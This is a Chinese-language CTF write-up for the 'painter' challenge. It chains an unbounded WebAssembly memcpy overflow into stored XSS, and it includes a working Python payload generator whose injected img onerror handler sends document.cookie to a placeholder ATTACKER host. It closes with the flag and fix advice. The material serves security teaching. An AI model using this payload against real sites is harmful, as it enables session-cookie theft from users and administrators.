# painter

## 题目简述

网页把保存的 Base64 画布传给 WebAssembly。C++ 结构体依次包含 4096 字节合成像素、8 字节名称、3 个各 4096 字节的图层和 16 位循环上限 `n`。导出函数却直接执行：

```cpp
memcpy(pixelData.layers, data, n);
```

这里的 `n` 完全来自客户端数组长度，没有限制为三个图层大小。攻击者既能越界覆盖结构体末尾的循环上限，又能让渲染循环越界写回 `name`；JavaScript 随后用 `innerHTML` 显示这个名称，最终形成 WebAssembly 内存破坏到存储型 XSS 的链路。

## 解题过程

正常图层总长度为 $3\times32\times32\times4=12288$ 字节。构造超过该长度的保存数据，在三个图层之后写入新的

$$
n=4096+\lvert\text{injection}\rvert.
$$

`loop()` 原本只应遍历 4096 字节 `pixels`，现在会继续写过数组末端，覆盖紧随其后的 `name`。图层的 RGBA 组合还会对 alpha 字节执行 `255 - value`，所以 payload 要按这条变换预编码注入字符串。

```python
import base64

width = height = 32
layer_size = width * height * 4
injection = b'<img src=1 onerror="location=\'https://ATTACKER/?c=\'+document.cookie">'

payload = [255] * layer_size
payload += [
    byte if (index - 3) % 4 != 0 else 255 - byte
    for index, byte in enumerate(injection)
] + [0, 0, 0, 0]
payload += [255] * (2 * layer_size - len(payload))
payload += [255] * layer_size

new_n = layer_size + len(injection)
payload += [new_n & 0xff, new_n >> 8]
payload += [255] * len(injection)
encoded = base64.b64encode(bytes(payload)).decode()
```

把 `encoded` 作为 `/save` 的 `img` 保存，并将返回的 `/img/<uuid>` 提交给管理员。渲染循环把注入内容写入 `pixelData.name`，页面的 `setName()` 再执行：

```javascript
document.getElementById('name-h1').innerHTML = name;
```

管理员 cookie 被发送到攻击者端，得到：

```text
tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}
```

## 方法总结

- WebAssembly 线性内存中的 C/C++ 越界仍会影响同模块其他字段；浏览器沙箱并不会阻止结构体内部的数据破坏。
- 本题的关键数据流是“无界 `memcpy` 覆盖 `n` → 扩大像素循环 → 越界改写 `name` → `innerHTML` 执行”，需要跨 C++、WASM 和 JavaScript 三层追踪。
- 修复应同时校验输入数组长度、固定循环上限，并用 `textContent` 显示名称；只修其中一层仍会留下其他攻击面。
